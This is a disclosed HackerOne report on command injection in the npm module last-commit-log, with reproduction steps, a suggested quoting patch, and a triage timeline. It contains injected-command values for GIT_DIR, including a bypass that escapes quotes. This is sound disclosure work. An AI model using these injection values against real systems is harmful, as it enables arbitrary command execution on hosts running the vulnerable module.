---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/command-injection-generic
  - env/web
  - stack/node
  - vuln/command-injection
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2020-11-29
submitted: 2020-05-24T11:57:12.726Z
bounty_usd: null
votes: 6
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bilk0h"
source: "https://hackerone.com/reports/881713"
title: "[last-commit-log] Command Injection"
---
# [last-commit-log] Command Injection

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2020-11-29

- Report: [https://hackerone.com/reports/881713](https://hackerone.com/reports/881713)
- CWE: Command Injection - Generic
- Submitted: 2020-05-24T11:57:12.726Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report `Command Injection` in `last-commit-log`
It allows `execution of arbitrary commands`

# Module

**module name:** `last-commit-log`
**version:** `last-commit-log@3.0.4`
**npm page:** `https://www.npmjs.com/package/last-commit-log`

## Module Description

Node.js module to get the last git commit information - mostly to be used by CI/CD and building phase.

## Module Stats

[3,253] downloads in the last week

# Vulnerability

The value of the GIT_DIR env variable is added to the command here on [line 10](https://github.com/node-modules/last-commit-log/blob/master/index.js#L10) and here on [line 25](https://github.com/node-modules/last-commit-log/blob/master/index.js#L25) and finally the command is executed on [line 36](https://github.com/node-modules/last-commit-log/blob/master/index.js#L36).

## Vulnerability Description

## Steps To Reproduce:
> npm i last-commit-log
>cat > test.js
const LCL = require('last-commit-log');
const lcl = new LCL('.'); // or `new LCL(dir)` dir is process.cwd() by default
>lcl
  .getLastCommit()
  .then(commit => console.log(commit));

Export malicious GIT_DIR string
>export GIT_DIR=". ;touch xxx;"

Run
>node test.js


{F840963}

## Patch

Fix: enclose --git-dir flag in quotes on line 10 like so
```this.gitDirStr = GIT_DIR ? `--git-dir="${GIT_DIR}/.git"` : '';```

## Supporting Material/References:

- [OPERATING SYSTEM VERSION] Ubuntu 18.04.4 LTS
- [NODEJS VERSION] v14.0.0
- [NPM VERSION] 6.14.4

# Wrap up

- I contacted the maintainer to let them know: [Y/N] No
- I opened an issue in the related repository: [Y/N] No

## Impact

Ability to run any command available for attacker.

## Timeline

- **Report Filed**
- **2020-05-24** @nochnoidozor: Hi @bilk0h,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@nochnoidozor
- **Report Triaged**
- **Report Severity Updated**
- **2020-05-28** @bilk0h: Thank you. I just would like to add that the patch I suggested in the write up is not adequate. It can be easily circumvented by escaping adding escaped double quotes a la: 
`export GIT_DIR=".\" ;touch xxx;\""`
- **2020-05-31** @nochnoidozor: HI @bilk0h - Thanks for the additional information.

Best,
@nochnoidozor
- **2020-08-09** @bbe8482aecd24374d13c5de15a0a6: I think `child_process.execFile`makes more sense here.
- **2020-08-31** @bilk0h: Hey. Would like to know where we are on the timeline. One hundred and eighty days need to elapse before I can disclose, correct?
- **2020-09-06** @bbe8482aecd24374d13c5de15a0a6: @bilk0h I'm not sure where the 180 days are mentioned but I see only 45 days mentioned at https://hackerone.com/nodejs-ecosystem?type=team

Afaik so far we did not pick up this report. I have sent an email to the maintainer regarding the findings.
- **2020-10-29** @bilk0h: Any response from maintainer?

@danielruf By not picked up, do you mean this will not be disclosed on hackerone?
- **2020-10-30** @bbe8482aecd24374d13c5de15a0a6: So far no response from the maintainer so we will continue with the disclosure process.
- **Report Title Updated**
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
